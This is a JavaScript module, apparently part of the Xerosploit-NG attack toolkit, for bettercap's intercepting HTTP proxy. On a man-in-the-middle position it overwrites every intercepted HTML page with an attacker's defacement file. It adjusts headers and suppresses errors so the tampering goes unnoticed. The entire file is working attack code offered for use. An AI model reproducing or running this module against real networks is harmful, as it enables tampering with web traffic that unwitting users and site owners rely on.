// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- Deface
//
// Replaces the whole body of every proxied text/html response with the
// contents of the file referenced by the generated global XE_TARGET_FILE
// ("Overwrite all web pages with your HTML code").
//
// Defacement variant of the bettercap v1 Ruby proxy module
//   lib/bettercap/proxy/http/modules/injecthtml.rb   (GPLv3)
// used by Xerosploit's "Deface" menu entry: v1 wrapped the user file in a
// `document.body.innerHTML = ...` script; here the page is simply overwritten.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_TARGET_FILE  absolute path of the defacement HTML page.
//
// Strict passthrough: anything that is not text/html is left untouched, and
// any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "deface";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

function onLoad() {
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (defacement file: " + target + ")");
}

function onResponse(req, res) {
    try {
        if (!xeIsHtml(res)) { return; }                                  // strict passthrough

        var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
        if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

        var payload = xeReadFile(target);
        if (payload === null || payload === "") { xeWarn("empty defacement file: " + target); return; }

        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
        xeLog("defacing " + where + " with " + target);

        if (typeof res.SetHeader === "function") {
            res.SetHeader("Content-Type", "text/html; charset=utf-8");
        }
        xeSetBody(res, payload);
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
